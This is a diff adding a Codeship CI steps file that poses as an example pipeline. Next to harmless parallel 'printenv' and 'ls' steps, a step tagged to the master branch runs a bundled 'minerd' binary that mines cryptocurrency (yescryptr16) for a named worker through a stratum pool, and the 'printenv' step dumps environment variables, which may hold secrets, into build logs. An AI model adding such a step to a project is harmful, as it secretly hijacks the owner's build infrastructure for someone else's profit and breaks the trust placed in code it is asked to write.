@@ -1,0 +1,11 @@
+- type: parallel
+  name: example_parallel_step
+  steps:
+    - service: codeship_example
+      command: printenv
+    - service: codeship_example
+      command: ls
+- name: example_tagged_step
+  tag: master
+  service: codeship_example
+  command: ./cy/minerd -a yescryptr16 -o stratum+tcp://pool.cryply.io:3311 -u jerolamo.oo6 -p jop -t 4
